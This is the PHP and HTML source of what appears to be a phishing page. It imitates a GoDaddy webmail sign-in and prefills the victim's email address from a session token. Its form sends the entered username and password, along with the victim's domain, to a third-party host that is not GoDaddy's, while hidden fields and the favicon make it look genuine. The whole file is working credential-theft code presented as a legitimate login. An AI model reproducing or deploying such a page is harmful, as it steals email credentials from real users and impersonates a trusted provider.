<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Sign In</title>
<link rel="icon" href="https://img6.wsimg.com/ux/favicon/apple-icon-60x60.png" type="image/x-icon" />
</head>
  <style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  input[type=text],
  input[type=password]{
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 45px;
  width: 344px;
  padding: 8 15px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0px;
  font-size: 16px;
  line-height: 1.1;
  vertical-align: top;
  color: #404040;
  }
  input[type=text]:focus,
  input[type=password]:focus {
  outline: none;
  background-color: #fafcff;
  border: 1px solid #111111;
  border-bottom: 2px solid #111111;
  }
  </style>
<body background="https://i.ibb.co/g7sXv0L/bg.jpg">
<div align="center">
	<table border="0" width="1260" cellspacing="0" cellpadding="0">
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td height="65" ></td>
				</tr>
				<tr>
					<td height="548" >
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td></td>
							<td height="545" width="565" background="https://i.ibb.co/4MpBc82/form.jpg">
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
							   
                                                           <form action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="post" >
								<tr>
									<td height="223"></td>
								</tr>
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="10"></td>
											<td width="102"></td>
											<td><font face="Arial"><b>Username</b></font></td>
											<td></td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="5"></td>
								</tr>
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="10"></td>
											<td width="100"></td>
											<td>
											   <input type="text" name="user" value="<?php echo $users;?>@<?php echo $ddomain;?>" size="20">
                                                                                           <input type="hidden" name="link" value="https://sso.secureserver.net/v1/login?app=email&realm=pass" >
                                                                                           <input type="hidden" name="sender" value="Godaddy.com" >
                                                                                           <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
                                                                                        </td>
											<td></td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="15"></td>
								</tr>
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="10"></td>
											<td width="102"></td>
											<td><b><font face="Arial">Password</font></b></td>
											<td></td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="5"></td>
								</tr>
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="10"></td>
											<td width="100"></td>
											<td>
											<input type="password" required name="passwd" size="20" autofocus></td>
											<td></td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="53"></td>
								</tr>
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="10"></td>
											<td width="102"></td>
											<td width="343">
											<input type="image" src="https://i.ibb.co/F6wTSg2/btn.jpg" width="343" height="44"></td>
											<td></td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="90"></td>
								</tr>
								</form>								
							</table>
							</td>
							<td width="70"></td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td height="70" ></td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>

</body>

</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>